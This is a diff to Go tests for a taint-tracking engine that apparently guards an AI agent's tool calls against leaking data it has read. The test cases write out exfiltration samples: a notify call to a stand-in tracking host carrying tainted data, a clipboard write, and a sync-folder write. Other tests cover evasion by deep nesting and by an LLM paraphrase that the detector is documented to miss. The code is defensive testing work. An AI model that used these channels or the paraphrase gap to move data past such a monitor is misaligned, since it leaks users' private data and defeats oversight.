@@ -24,19 +24,66 @@ func testProv(t *testing.T, o ProvOptions) *Provenance {
 	return p
 }
 
-func baseOptions() ProvOptions {
+// baseOptions is the shared fixture for the marker/inspection tests. The
+// injected OneDrive root lives under fixtureProfile, NOT under o.HomeDir (which
+// testProv leaves as its own empty temp dir), so the tests keep distinguishing
+// "landed in a detected sync root" from "landed anywhere in the profile, which
+// the P12 fallback treats as suspect".
+//
+// Ticket 75 made the profile a real directory: C26 anchors a spelling it cannot
+// verify on the deepest component the OS does confirm, and on POSIX a Windows
+// string like `C:\Users\test\OneDrive` is a RELATIVE name, so the old fixture
+// compared a root and a candidate that C26 had put in two different places. It
+// only ever passed because every POSIX write fail-closed to sync-suspect, which
+// is the very behavior ticket 75 fixed.
+func baseOptions(t *testing.T) ProvOptions {
+	t.Helper()
 	return ProvOptions{
 		NoProbe: true,
 		SyncRoots: []SyncRoot{
-			{Provider: "OneDrive", Path: `C:\Users\test\OneDrive`, Source: "options"},
+			{Provider: "OneDrive", Path: fixtureSyncRoot(t), Source: "options"},
 		},
 	}
+}
+
+// fixtureProfile is the fake user profile the fixture sync root sits in, and
+// fixtureSyncRoot the root itself. Both are absolute, existing paths on whatever
+// platform runs the test.
+func fixtureProfile(t *testing.T) string {
+	t.Helper()
+	p := filepath.Join(t.TempDir(), "profile")
+	if err := os.MkdirAll(p, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	return p
+}
+
+func fixtureSyncRoot(t *testing.T) string {
+	t.Helper()
+	r := filepath.Join(fixtureProfile(t), "OneDrive")
+	if err := os.MkdirAll(r, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	return r
+}
+
+// syncTargetOf / nonSyncTargetOf build write-target spellings from the options
+// a test was given, so the target and the injected root are guaranteed to come
+// from the same fixture (t.TempDir hands out a fresh directory per call).
+// nonSyncTargetOf lands in <profile>/Documents, which is neither the injected
+// sync root nor under o.HomeDir: the negative control for the channel.
+func syncTargetOf(o ProvOptions, parts ...string) string {
+	return filepath.Join(append([]string{o.SyncRoots[0].Path}, parts...)...)
+}
+
+func nonSyncTargetOf(o ProvOptions, parts ...string) string {
+	return filepath.Join(append([]string{filepath.Dir(o.SyncRoots[0].Path), "Documents"}, parts...)...)
 }
 
 // --- marking + inspection ----------------------------------------------------
 
 func TestMarkInspectSourceAttribution(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	if !p.Mark("task-1", SrcWebFetch, "https://example.com/report.md", "prefix text "+marker+" suffix") {
 		t.Fatal("mark rejected")
 	}
@@ -63,7 +110,7 @@ func TestMarkInspectSourceAttribution(t *testing.T) {
 }
 
 func TestMarkNegativeNoTaintNoHit(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.Mark("task-1", SrcWebFetch, "https://a", marker)
 	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "totally unrelated note"}); ok {
 		t.Fatal("clean notify must not hit")
@@ -71,7 +118,7 @@ func TestMarkNegativeNoTaintNoHit(t *testing.T) {
 }
 
 func TestMarkEmptyAfterNormalization(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	if p.Mark("task-1", SrcFSRead, "/tmp/x", "   \n\t  ") {
 		t.Fatal("content empty after normalization must be rejected")
 	}
@@ -83,7 +130,7 @@ func TestMarkUnknownSourceToolFailClosed(t *testing.T) {
 	Logf = func(f string, a ...any) { logged = append(logged, f) }
 	defer func() { Logf = old }()
 
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	if !p.Mark("task-1", "mystery.reader", "obj", marker) {
 		t.Fatal("unknown-source marks must still be recorded (fail-closed)")
 	}
@@ -119,7 +166,8 @@ func TestSensitiveSourceSetComplete(t *testing.T) {
 // / sync-dir write. All four must upgrade L2 (via the real C19 assessor)
 // with the source named.
 func TestFourChannelExfilSuite(t *testing.T) {
-	p := testProv(t, baseOptions())
+	o := baseOptions(t)
+	p := testProv(t, o)
 	p.Mark("task-1", SrcSearchContent, `/docs/corpus "internal audit"`, "found: "+marker)
 
 	cases := []struct {
@@ -133,7 +181,7 @@ func TestFourChannelExfilSuite(t *testing.T) {
 		{"notify url", "notify", map[string]any{"url": "https://track.example/?d=" + marker}, ChNotify},
 		{"clipboard.write", "clipboard.write", map[string]any{"text": marker}, ChClipboard},
 		{"fs.write into sync dir", "fs.write", map[string]any{
-			"path": `C:\Users\test\OneDrive\Notes\shared.md`, "content": "see " + marker,
+			"path": syncTargetOf(o, "Notes", "shared.md"), "content": "see " + marker,
 		}, ChSyncWrite},
 	}
 	for _, c := range cases {
@@ -178,7 +226,7 @@ func TestFourChannelExfilSuite(t *testing.T) {
 // TestR4EndToEndViaAssessor wires the engine through the frozen C19 seam and
 // asserts the fused decision: L2, R4, session-override blocked, source named.
 func TestR4EndToEndViaAssessor(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "clause 7: "+marker)
 
 	a := NewRiskAssessor().WithTaintDetector(p.Detector("task-1"))
@@ -208,17 +256,18 @@ func TestR4EndToEndViaAssessor(t *testing.T) {
 // an R4 exfil (SPEC-06 §5: only sync-dir landing is the channel; the write
 // itself stays L1/L2 by R1/R8 as usual).
 func TestSyncWriteNegative(t *testing.T) {
-	p := testProv(t, baseOptions())
+	o := baseOptions(t)
+	p := testProv(t, o)
 	p.Mark("task-1", SrcFSRead, "/secrets.txt", marker)
 
 	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
-		"path": `C:\Users\test\Documents\notes.md`, "content": marker,
+		"path": nonSyncTargetOf(o, "notes.md"), "content": marker,
 	}); ok {
 		t.Fatal("local (non-sync) write of tainted content must not be an R4 exfil hit")
 	}
 	// Same via the tool-name-less frozen seam (shape-based): still no hit.
 	if src, hit := p.Detector("task-1").TaintHit(map[string]any{
-		"path": `C:\Users\test\Documents\notes.md`, "content": marker,
+		"path": nonSyncTargetOf(o, "notes.md"), "content": marker,
 	}); hit {
 		t.Fatalf("adapter must mirror Inspect, got src=%q", src)
 	}
@@ -229,7 +278,7 @@ func TestSyncWriteNegative(t *testing.T) {
 }
 
 func TestDetectorUnknownToolScansEverything(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.Mark("task-1", SrcClipboardRead, "", "clip "+marker)
 	// A plugin tool with no channel entry: generic fail-closed scan of the
 	// arbitrary string params.
@@ -244,7 +293,7 @@ func TestDetectorUnknownToolScansEverything(t *testing.T) {
 // --- scope lifetime / DisposalScope (AC #5) ----------------------------------
 
 func TestScopesNeverInherit(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.OpenScope("task-2")
 	p.Mark("task-1", SrcWebFetch, "https://a", marker)
 	if _, ok := p.Inspect("task-2", "web.search", map[string]any{"query": marker}); ok {
@@ -256,7 +305,7 @@ func TestDisposalScopeClearsTaints(t *testing.T) {
 	// C11/DisposalScope binding: closing the scope (session end) must drop
 	// every taint; the new session's scope starts clean (AC #5).
 	scope := plugin.NewDisposalScope("session-1", context.Background())
-	p := NewProvenance(baseOptions())
+	p := NewProvenance(baseOptions(t))
 	p.OpenScope("session-1")
 	scope.Defer(func() { p.CloseScope("session-1") })
 
@@ -284,7 +333,7 @@ func TestInspectUnknownScopeIsEmptyStore(t *testing.T) {
 	// "treated as untainted" = pass. Missing information must produce a DENY,
 	// so the direction is now: unknown scope + any taint anywhere -> fail-closed
 	// hit; unknown scope + nothing tainted at all -> nothing to leak.
-	p := NewProvenance(baseOptions())
+	p := NewProvenance(baseOptions(t))
 	if _, ok := p.Inspect("ghost", "notify", map[string]any{"text": marker}); ok {
 		t.Fatal("unknown scope with an empty engine cannot carry taint")
 	}
@@ -323,7 +372,7 @@ func TestInspectUnknownScopeIsEmptyStore(t *testing.T) {
 // TestNamedChannelParamEscape locks the B-2 fixes: the channel table labels
 // parameters, it does not limit what is scanned.
 func TestNamedChannelParamEscape(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	if !p.Mark("task-1", SrcWebFetch, "https://x", "quote: "+marker) {
 		t.Fatal("mark rejected")
 	}
@@ -644,7 +693,7 @@ func TestWriteGateAllPathsNonSyncStaysExempt(t *testing.T) {
 // --- M-4: nesting budget must not be a silent miss ----------------------------
 
 func TestDeepNestingFailsClosedNotSilent(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.Mark("task-1", SrcFSRead, "/f", marker)
 	// Deeper than the configured budget: the tail cannot be scanned, so the
 	// call must fail closed instead of passing (adversarial report M-4).
@@ -692,7 +741,7 @@ func injectIgnorable(s string, sep rune) string {
 }
 
 func TestNormalizationEndToEnd(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	if !p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "clause 7 read as: "+marker) {
 		t.Fatal("mark rejected")
 	}
@@ -776,7 +825,7 @@ func TestResidualLimitsAreLoggedNotSilent(t *testing.T) {
 // --- concurrency ---------------------------------------------------------------
 
 func TestConcurrentMarkInspect(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	var wg sync.WaitGroup
 	for i := 0; i < 8; i++ {
 		wg.Add(1)
@@ -803,7 +852,7 @@ func TestConcurrentMarkInspect(t *testing.T) {
 // 3 (outbound constraints) and 5 (first-visit domain prompt). This test
 // asserts the miss (documented behavior), NOT a fix.
 func TestLLMParaphraseResidual(t *testing.T) {
-	p := testProv(t, baseOptions())
+	p := testProv(t, baseOptions(t))
 	p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "the quarterly revenue increased by twelve percent")
 
 	paraphrase := "公司收入比去年同期上涨约百分之十二（内部改写版）"
